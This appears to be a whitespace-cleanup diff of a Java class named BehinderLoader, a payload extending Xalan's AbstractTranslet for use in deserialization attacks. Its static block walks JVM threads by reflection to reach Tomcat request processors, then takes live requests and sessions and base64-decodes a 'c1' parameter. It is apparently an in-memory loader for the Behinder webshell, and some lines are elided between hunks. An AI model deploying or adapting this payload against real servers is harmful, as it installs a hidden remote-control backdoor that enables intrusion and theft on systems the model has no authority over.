@@ -17,11 +17,9 @@ import java.lang.reflect.Method;
 import java.util.List;
 
 public class BehinderLoader extends AbstractTranslet {
-
     public static Object getField(Object var0, String var1) throws Exception {
         Field var2 = null;
         Class var3 = var0.getClass();
-
         while(var3 != Object.class) {
             try {
                 var2 = var3.getDeclaredField(var1);
@@ -30,7 +28,6 @@ public class BehinderLoader extends AbstractTranslet {
                 var3 = var3.getSuperclass();
             }
         }
-
         if (var2 != null) {
             var2.setAccessible(true);
             return var2.get(var0);
@@ -38,20 +35,14 @@ public class BehinderLoader extends AbstractTranslet {
             throw new NoSuchFieldException(var1);
         }
     }
-
     public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
     }
-
     public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
     }
-
-    //此处除了用静态代码块，还可以用requestInitialized方法
-
     static {
         try {
             boolean var0 = false;
             Thread[] var1 = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
-
             for(int var2 = 0; var2 < var1.length; ++var2) {
                 Thread var3 = var1[var2];
                 if (var3 != null) {
@@ -66,7 +57,6 @@ public class BehinderLoader extends AbstractTranslet {
                                 var22.printStackTrace();
                             }
                         }
-
                         if (var6 != null) {
                             List var7 = (List)getField(var6, "processors");
                             var2 = 0;
@@ -76,7 +66,6 @@ public class BehinderLoader extends AbstractTranslet {
                                 org.apache.catalina.connector.Request var10 = (org.apache.catalina.connector.Request)var9.getNote(1);
                                 Response var11 = var10.getResponse();
                                 HttpSession var12 = var10.getSession();
-
                                 try {
                                     String var13 = var10.getParameter("c1");
                                     byte[] var14 = (new BASE64Decoder()).decodeBuffer(var13);
@@ -99,7 +88,6 @@ public class BehinderLoader extends AbstractTranslet {
                         }
                     }
                 }
-
                 if (var0) {
                     break;
                 }
@@ -107,6 +95,5 @@ public class BehinderLoader extends AbstractTranslet {
         } catch (Exception var23) {
             var23.printStackTrace();
         }
-
     }
 }
